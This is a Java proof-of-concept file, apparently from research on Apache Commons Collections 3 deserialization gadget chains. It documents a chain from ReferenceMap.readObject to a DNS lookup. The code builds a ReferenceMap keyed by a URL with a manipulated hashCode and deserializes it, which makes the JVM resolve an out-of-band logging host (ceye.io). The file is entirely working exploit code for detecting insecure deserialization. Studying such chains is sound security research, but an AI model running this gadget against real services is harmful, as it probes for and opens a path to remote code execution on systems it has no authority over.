package com.example.CC3;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import org.apache.commons.collections.map.ReferenceMap;

import java.net.URL;

public class POC_7 {

    /***
     * <org.apache.commons.collections.map.ReferenceMap: void readObject(java.io.ObjectInputStream)>
     * <org.apache.commons.collections.map.AbstractReferenceMap: void doReadObject(java.io.ObjectInputStream)>
     * <org.apache.commons.collections.map.AbstractReferenceMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
     * <org.apache.commons.collections.map.AbstractHashedMap: int hash(java.lang.Object)>
     * <java.net.URL: int hashCode()>
     * <java.net.URLStreamHandler: int hashCode(java.net.URL)>
     * <java.net.URLStreamHandler: java.net.InetAddress getHostAddress(java.net.URL)>
     * <java.net.InetAddress: java.net.InetAddress getByName(java.lang.String)>
     */

    public static void main(String[] args) throws Exception {
        URL url = new URL("http://k2nlbt.ceye.io");
        ReflectionUtil.setField(url,"hashCode",1);
        ReferenceMap map = new ReferenceMap();
        map.put(url, 1);
        ReflectionUtil.setField(url,"hashCode",-1);

        SerializeUtil.deserialize(SerializeUtil.serialize(map));
    }

}
